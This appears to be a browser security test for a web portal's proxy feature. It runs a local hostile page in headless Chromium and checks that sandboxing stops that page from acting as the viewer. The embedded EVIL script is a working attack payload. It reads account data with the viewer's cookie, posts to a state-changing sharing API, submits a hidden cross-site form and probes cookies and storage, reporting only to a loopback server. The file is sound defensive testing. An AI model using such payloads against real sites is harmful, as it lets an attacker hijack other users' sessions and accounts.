"""A hostile proxied page, in a real browser (release 1.24.1). Skipped without Chromium and Playwright.

The portal runs as a child process on loopback (the same temporary-database app tests/grant_harness.py
boots) with a local "upstream" whose pages try to act as the person who opens them: call a state-changing
API and read portal data with the viewer's cookie, submit a form to a state-changing route, open a popup.
Chromium (headless, started with the offline flags of tools/make_screenshots.py, so nothing leaves this
machine) opens them as the viewer through /proxy/<id> and through the embedded browser /browser.

Needs: Playwright importable in the interpreter that runs this file, /usr/bin/chromium (or $CHROMIUM), and a
portal interpreter for the child ($PORTAL_TEST_PYTHON, else ./venv/bin/python, else the one running this).
Run: <venv with playwright>/bin/python tests/test_proxy_origin_browser.py
It proves Chromium only; Firefox and Safari are not tested.
"""

import json
import os
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
failures = []


def check(name, passed, detail=""):
    print(("ok:   " if passed else "FAIL: ") + name + (f"  ({str(detail)[:300]})" if detail and not passed else ""), flush=True)
    if not passed:
        failures.append(name)


# ---------------------------------------------------------------------------------------------------------
# Child: the portal and the hostile upstream
# ---------------------------------------------------------------------------------------------------------

EVIL = r"""<!doctype html><html><head><title>evil-title</title></head><body>
<h1 id="h">evil</h1>
<script>
var out = {};
// An unpatched fetch from a fresh frame is what an attacker reaches for. On the portal origin (a trusted page) it works;
// in an opaque origin a new frame is cross-origin to its creator, so the patched one is all that is left.
var nf; try { nf = (function(){ var i = document.createElement('iframe'); i.style.display = 'none'; document.body.appendChild(i); return i.contentWindow.fetch.bind(i.contentWindow); })(); } catch (e) { nf = function(){ return fetch.apply(window, arguments); }; }
function done(){ fetch('/__report', {method:'POST', body: JSON.stringify(out)}); }
async function t(name, fn){ try { out[name] = await fn(); } catch(e) { out[name] = 'ERR ' + e.name; } }
(async function(){
  var O = location.origin;
  await t('read_me', async function(){ var r = await nf(O + '/api/me', {credentials:'include'}); return r.status + ' ' + (await r.text()).slice(0, 80); });
  await t('read_me_nocred', async function(){ var r = await nf(O + '/api/me'); return r.status + ' ' + (await r.text()).slice(0, 80); });
  await t('post_share', async function(){ var r = await nf(O + '/api/connections/__WEB__/shares', {method:'POST', credentials:'include',
        headers:{'Content-Type':'application/json'}, body: JSON.stringify({usernames:['carol']})}); return r.status + ' ' + (await r.text()).slice(0, 80); });
  await t('read_dashboard', async function(){ var r = await nf(O + '/dashboard', {credentials:'include'}); return r.status + ' ' + (await r.text()).length; });
  await t('storage', function(){ localStorage.setItem('a', 'b'); return 'ok'; });
  await t('cookie', function(){ return 'cookie=[' + document.cookie + ']'; });
  await t('parent', function(){ return String(window.parent.location.href); });
  await t('origin', function(){ return String(window.origin); });
  // a form posting to a state-changing route, as a navigation of a hidden frame
  var f = document.createElement('iframe'); f.name = 'sink'; document.body.appendChild(f);
  var form = document.createElement('form'); form.method = 'POST'; form.action = O + '/api/connections/__WEB__/shares'; form.target = 'sink';
  var inp = document.createElement('input'); inp.name = 'usernames'; inp.value = 'carol'; form.appendChild(inp); document.body.appendChild(form);
  try { form.submit(); out.form = 'submitted'; } catch(e) { out.form = 'ERR ' + e.name; }
  // a popup: it inherits the sandbox, so it is an opaque origin too
  window.addEventListener('message', function(e){ out.popup = e.data; });
  try { window.open('/popup'); } catch(e) { out.popup = 'ERR'; }
  await new Promise(function(r){ setTimeout(r, 1500); });
  done();
})();
</script></body></html>"""

POPUP = "<!doctype html><script>opener && opener.postMessage('popup origin=' + window.origin, '*')</script>"

APP = r"""<!doctype html><html><head><title>app-title</title><link rel="stylesheet" href="/app.css"></head><body>
<p id="p">app</p><form id="f" method="post" action="/post"><input name="a" value="1"></form>
<script src="/app.js"></script><script type="module" src="/mod.js"></script>
<script>
var out = {css: null};
window.addEventListener('load', function(){
  out.css = getComputedStyle(document.getElementById('p')).color;
  out.appjs = window.APPJS === 1; out.mod = window.MODJS === 1;
  var w = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws');
  w.onmessage = function(e){ out.ws = e.data; };
  fetch('/data').then(function(r){ return r.json(); }).then(function(j){ out.fetch = j.ok; }).catch(function(e){ out.fetch = 'ERR ' + e.name; });
  fetch('/cookieset').then(function(){ return fetch('/cookiecheck'); }).then(function(r){ return r.json(); })
    .then(function(j){ out.cookie = j.cookie; }).catch(function(e){ out.cookie = 'ERR ' + e.name; });
  try { navigator.serviceWorker.register('/sw.js').then(function(){ out.sw = 'registered'; }, function(e){ out.sw = 'refused ' + e.name; }); } catch (e) { out.sw = 'unavailable'; }
  fetch('/data').then(function(r){ return r.text(); }).then(function(){
    setTimeout(function(){ fetch('/__report?tag=app', {method:'POST', body: JSON.stringify(out)}).then(function(){ document.getElementById('f').submit(); }); }, 800);
  });
});
</script></body></html>"""


def serve():
    sys.path.insert(0, str(ROOT / "tests"))
    import asyncio
    import grant_harness as h
    from grant_harness import server
    import aiohttp
    from aiohttp import web
    from aiohttp.test_utils import TestServer
    from config import Config

    results = {}

    async def main():
        env = await h.boot(names=("owner", "bob", "carol", "adm", "adm2"), superadmin=("adm", "adm2"))
        db = env.db
        up = web.Application()
        state = {"uuid_web": "", "posts": []}

        async def evil(request):
            return web.Response(text=EVIL.replace("__WEB__", state["uuid_web"]), content_type="text/html")

        async def report(request):
            body = await request.text()
            tag = request.query.get("tag") or ("evil:" + (request.headers.get("X-Tag") or ""))
            results.setdefault(tag, []).append(json.loads(body))
            return web.Response(text="ok")

        async def page(request):
            return web.Response(text=APP, content_type="text/html")

        async def post(request):
            state["posts"].append(await request.text())
            results.setdefault("post", []).append(await request.text() or "x")
            return web.Response(text="<html><title>posted</title>posted</html>", content_type="text/html")

        async def ws(request):
            w = web.WebSocketResponse()
            await w.prepare(request)
            await w.send_str("ws-hello")
            await w.close()
            return w

        async def sharestate(request):
            cid = (await (await db.conn.execute("SELECT id FROM user_connections WHERE uuid = ?", (state["uuid_web"],))).fetchone())["id"]
            return web.json_response({"shares": sorted(s["username"] for s in await db.list_connection_shares(cid))})

        async def me(request):
            return web.json_response({"upstream": True})

        up.router.add_get("/evil", evil)
        up.router.add_get("/", evil)
        up.router.add_get("/popup", lambda r: web.Response(text=POPUP, content_type="text/html"))
        up.router.add_get("/app", page)
        up.router.add_get("/app.js", lambda r: web.Response(text="window.APPJS=1;", content_type="application/javascript"))
        up.router.add_get("/mod.js", lambda r: web.Response(text="window.MODJS=1;", content_type="application/javascript"))
        up.router.add_get("/app.css", lambda r: web.Response(text="#p{color:rgb(1, 2, 3)}", content_type="text/css"))
        up.router.add_get("/data", lambda r: web.json_response({"ok": "data-ok"}))
        up.router.add_get("/ws", ws)

        async def cookieset(request):
            return web.Response(text="ok", headers={"Set-Cookie": "k=v; Path=/"})

        async def cookiecheck(request):
            return web.json_response({"cookie": request.headers.get("Cookie", "")})

        up.router.add_get("/cookieset", cookieset)
        up.router.add_get("/cookiecheck", cookiecheck)
        up.router.add_get("/sw.js", lambda r: web.Response(text="self.addEventListener('fetch',()=>{})", content_type="application/javascript"))
        up.router.add_get("/r", lambda r: web.Response(status=302, headers={"Location": "/app?r=1"}))
        up.router.add_post("/post", post)
        up.router.add_post("/__report", report)
        up.router.add_get("/__shares", sharestate)
        up.router.add_get("/__results", lambda r: web.json_response(results))
        upstream = TestServer(up, host="127.0.0.1")
        await upstream.start_server()

        async def no_resolve(host, port=0):
            return []
        server.resolve_checked_host = no_resolve
        server.resolve_checked_host_cached = no_resolve
        server._SSRFSafeConnector = lambda ssl=None, **kw: aiohttp.TCPConnector(ssl=ssl)

        async def conn(who, name, config="{}"):
            return await db.create_user_connection(env.uid[who], name, "http", "127.0.0.1", upstream.port, config)

        web_m = await conn("owner", "member-web")
        web_a = await conn("adm", "admin-web")
        br_m = await conn("owner", "member-browser", json.dumps({"browser_mode": True}))
        state["uuid_web"] = web_m
        for u, who in ((web_m, "bob"), (web_m, "adm2"), (web_a, "bob"), (br_m, "bob"), (br_m, "adm2")):
            cid = (await (await db.conn.execute("SELECT id FROM user_connections WHERE uuid = ?", (u,))).fetchone())["id"]
            await db.add_connection_share(cid, env.uid[who], env.uid["owner"], None)
            if hasattr(server, "proxy_origin"):      # (the first-open notice exists since 1.24.1; this file also runs on older code)
                await db.accept_share_notice(cid, env.uid[who], server.proxy_origin.target_fingerprint(
                    await db.get_connection_for_admin(u), (await db.get_connection_for_admin(u))["config"]))
        cookies = {}
        for who, sess in env.sessions.items():
            cookies[who] = [c.value for c in sess.cookie_jar if c.key == Config.SESSION_COOKIE_NAME][0]
        print("READY " + json.dumps({"base": env.base, "upstream": f"http://127.0.0.1:{upstream.port}", "web_m": web_m,
                                     "web_a": web_a, "br_m": br_m, "cookies": cookies, "cookie_name": Config.SESSION_COOKIE_NAME}), flush=True)
        loop = asyncio.get_running_loop()
        await loop.run_in_executor(None, sys.stdin.readline)      # until the parent closes our stdin
        await h.shutdown(env)
        await upstream.close()

    asyncio.run(main())


# ---------------------------------------------------------------------------------------------------------
# Parent: Chromium
# ---------------------------------------------------------------------------------------------------------

OFFLINE_ARGS = [
    "--no-sandbox", "--host-resolver-rules=MAP * ~NOTFOUND, EXCLUDE 127.0.0.1, EXCLUDE localhost",
    "--disable-background-networking", "--disable-component-update", "--disable-sync", "--disable-default-apps",
    "--disable-field-trial-config", "--no-first-run", "--disable-domain-reliability", "--no-pings",
    "--disable-breakpad", "--disable-client-side-phishing-detection", "--safebrowsing-disable-auto-update",
    "--no-proxy-server",
]


def get_json(url):
    with urllib.request.urlopen(url, timeout=5) as r:
        return json.loads(r.read())


def wait_for(fn, seconds=15):
    end = time.time() + seconds
    while time.time() < end:
        v = fn()
        if v:
            return v
        time.sleep(0.3)
    return None


def run_browser(info):
    from playwright.sync_api import sync_playwright
    base, up = info["base"], info["upstream"]
    chromium = os.environ.get("CHROMIUM", "/usr/bin/chromium")
    with sync_playwright() as pw:
        browser = pw.chromium.launch(executable_path=chromium, headless=True, args=OFFLINE_ARGS)

        def ctx_for(who):
            ctx = browser.new_context()
            ctx.add_cookies([{"name": info["cookie_name"], "value": info["cookies"][who], "url": base, "httpOnly": True, "sameSite": "Lax"}])
            return ctx

        def results():
            return get_json(up + "/__results")

        # 1. a member's connection shared with an administrator: the hostile page cannot act as the administrator
        ctx = ctx_for("adm2")
        page = ctx.new_page()
        if os.environ.get("DEBUG"):
            page.on("console", lambda m: print("console:", m.text[:200]))
            page.on("pageerror", lambda e: print("pageerror:", str(e)[:200]))
        page.goto(f"{base}/proxy/{info['web_m']}/evil")
        got = wait_for(lambda: results().get("evil:"))
        check("isolated (administrator viewing a member's page): the page ran and reported", bool(got))
        r = (got or [{}])[-1]
        check("it cannot read /api/me as the viewer (not a 200 with their data)", not str(r.get("read_me", "")).startswith("200"), r.get("read_me"))
        check("... with the cookie included either", not str(r.get("read_me_nocred", "")).startswith("200"), r.get("read_me_nocred"))
        check("it cannot make a state-changing call as the viewer", not str(r.get("post_share", "")).startswith(("200", "201")), r.get("post_share"))
        check("it cannot read a portal page", not str(r.get("read_dashboard", "")).startswith("200"), r.get("read_dashboard"))
        check("it has no storage and no cookies of its own (opaque origin)", str(r.get("storage", "")).startswith("ERR") and str(r.get("cookie", "")).startswith("ERR"), (r.get("storage"), r.get("cookie")))
        check("(opened on its own, its parent is itself)", r.get("parent") == page.url or str(r.get("parent", "")).startswith("ERR"), r.get("parent"))
        check("its origin is opaque", r.get("origin") == "null", r.get("origin"))
        check("a popup it opens is an opaque origin as well", r.get("popup") == "popup origin=null", r.get("popup"))
        time.sleep(1.0)
        check("the form it submitted to a state-changing route changed nothing (carol was not added)", "carol" not in get_json(up + "/__shares")["shares"], get_json(up + "/__shares"))
        check("the isolated page was reached through a capability address", "/~" in page.url, page.url)
        ctx.close()

        # 2. the owner looks at their own: unchanged, the script runs as the owner (the upstream can only act as the person who configured it)
        results_before = len(results().get("evil:", []))
        ctx = ctx_for("owner")
        page = ctx.new_page()
        page.goto(f"{base}/proxy/{info['web_m']}/evil")
        got = wait_for(lambda: len(results().get("evil:", [])) > results_before)
        r = results().get("evil:", [{}])[-1]
        check("trusted (owner on their own connection): served unsandboxed, no redirect", "/~" not in page.url, page.url)
        check("trusted: the page's script still reads /api/me as the owner (the old behaviour)", str(r.get("read_me", "")).startswith("200"), r.get("read_me"))
        # Characterisation, not a wish: script that runs unsandboxed on the portal origin can hide its Referer (a call made
        # through a fresh frame has none), so the Referer rule is a seat belt for trusted content, not a wall. The wall is
        # the sandbox of the isolated pages above. The README says so.
        check("trusted: a script that hides its Referer is NOT stopped (known limit of the seat belt; trusted content is trusted)",
              str(r.get("post_share", "")).startswith("200"), r.get("post_share"))
        ctx.close()

        # 3. the embedded browser: a hostile page opened in browser mode cannot act as the viewer, the frame controls work
        ctx = ctx_for("bob")
        page = ctx.new_page()
        shares_before = get_json(up + "/__shares")["shares"]
        n0 = len(results().get("evil:", []))
        page.goto(f"{base}/browser?connection={info['br_m']}")
        got = wait_for(lambda: len(results().get("evil:", [])) > n0)
        r = results().get("evil:", [{}])[-1]
        check("embedded browser: the hostile page ran in the frame", bool(got))
        check("embedded browser: it cannot read /api/me, post, or read the dashboard as the viewer",
              not str(r.get("read_me", "")).startswith("200") and not str(r.get("post_share", "")).startswith("200")
              and not str(r.get("read_dashboard", "")).startswith("200"), r)
        check("embedded browser: it cannot reach the browser page that frames it", str(r.get("parent", "")).startswith("ERR"), r.get("parent"))
        wait_for(lambda: page.input_value("#url-input") not in ("", "about:blank"), 6)
        shown = page.input_value("#url-input")
        # bob is a grantee: the address bar names the connection and the path, never the shared host or the capability
        check("embedded browser: a grantee's address bar shows the connection's name and path, with no host, port or capability",
              "127.0.0.1" not in shown and str(up.rsplit(":", 1)[-1]) not in shown and "~" not in shown and shown != "", shown)
        wait_for(lambda: "evil-title" in page.inner_text(".tab-bar"), 6)
        check("embedded browser: the tab shows the page's title", "evil-title" in page.inner_text(".tab-bar"), page.inner_text(".tab-bar"))
        time.sleep(0.5)
        check("embedded browser: nothing was changed behind the viewer's back", get_json(up + "/__shares")["shares"] == shares_before)
        ctx.close()

        # 4. an isolated page still works: sub-resources, a module script, a form, a WebSocket, fetch
        ctx = ctx_for("bob")
        page = ctx.new_page()
        page.goto(f"{base}/proxy/{info['web_m']}/app")
        got = wait_for(lambda: results().get("app") and results().get("post"), 15)
        r = (results().get("app") or [{}])[-1]
        check("isolated app: stylesheet, script, module script load", r.get("css") == "rgb(1, 2, 3)" and r.get("appjs") is True and r.get("mod") is True, r)
        check("isolated app: fetch and WebSocket under its own prefix work", r.get("fetch") == "data-ok" and r.get("ws") == "ws-hello", r)
        check("isolated app: its form posts to its own upstream", bool(results().get("post")), results().get("post"))
        check("isolated app: the cookie its upstream set comes back on the next fetch (kept by the portal, not the browser)", r.get("cookie") == "k=v", r.get("cookie"))
        # a later page of the same app, reached by navigation, still carries the cookie (a login that lasts across pages)
        cap_dir = page.url.split("?", 1)[0].rsplit("/app", 1)[0]
        page.goto(cap_dir + "/cookiecheck")
        check("isolated app: a page opened later in the same session still gets the cookie, and the browser holds none",
              '"k=v"' in page.inner_text("body") and "/~pc1." in page.url and not [c for c in ctx.cookies() if c["name"] == "k"], page.inner_text("body")[:120])
        ctx.close()

        # 5. an administrator's own application is unchanged, with cookies, forms, redirects and sockets
        ctx = ctx_for("bob")
        page = ctx.new_page()
        page.goto(f"{base}/proxy/{info['web_a']}/app")
        got = wait_for(lambda: len(results().get("app", [])) >= 2, 15)
        r = results().get("app", [{}, {}])[-1]
        check("administrator-owned app (opened by a member): no redirect, no capability in the address", "/~" not in page.url, page.url)
        check("administrator-owned app: its own cookie comes back (a trusted page keeps its cookies)", r.get("cookie") == "k=v", r.get("cookie"))
        check("administrator-owned app: a service worker is still refused by the page policy (worker-src 'none')",
              str(r.get("sw", "")).startswith(("refused", "unavailable")), r.get("sw"))
        check("administrator-owned app: its form posted again (two posts in all)", len(results().get("post", [])) >= 2, results().get("post"))
        redirected = ctx.request.get(f"{base}/proxy/{info['web_a']}/r")
        check("administrator-owned app: a redirect of the upstream is followed inside the proxy", redirected.status == 200 and "app-title" in redirected.text(), redirected.status)
        print("TRUSTED-APP-RESULT " + json.dumps({k: r.get(k) for k in sorted(r)}))
        check("administrator-owned app: script, module, stylesheet, fetch and WebSocket as before",
              r.get("css") == "rgb(1, 2, 3)" and r.get("appjs") is True and r.get("mod") is True and r.get("fetch") == "data-ok" and r.get("ws") == "ws-hello", r)
        ctx.close()
        browser.close()


def main():
    if "--serve" in sys.argv:
        serve()
        return
    try:
        import playwright.sync_api  # noqa: F401
    except ImportError:
        print("skip: Playwright is not importable here")
        return
    if not Path(os.environ.get("CHROMIUM", "/usr/bin/chromium")).exists():
        print("skip: no Chromium")
        return
    py = os.environ.get("PORTAL_TEST_PYTHON") or (str(ROOT / "venv" / "bin" / "python") if (ROOT / "venv" / "bin" / "python").exists() else "")
    if not py:
        print("skip: no portal interpreter (set PORTAL_TEST_PYTHON)")
        return
    child = subprocess.Popen([py, __file__, "--serve"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)
    try:
        deadline = time.time() + 60
        info = None
        while time.time() < deadline:
            line = child.stdout.readline()
            if line.startswith("READY "):
                info = json.loads(line[6:])
                break
            if not line and child.poll() is not None:
                break
        check("the portal child started", info is not None)
        import threading
        threading.Thread(target=lambda: [None for _ in child.stdout], daemon=True).start()    # keep the pipe drained
        if info:
            run_browser(info)
    finally:
        try:
            child.stdin.close()
            child.wait(timeout=10)
        except Exception:
            child.kill()
    if failures:
        print(f"\ntest_proxy_origin_browser: {len(failures)} FAILED: " + "; ".join(failures))
        sys.exit(1)
    print("\ntest_proxy_origin_browser: all checks passed")


main()
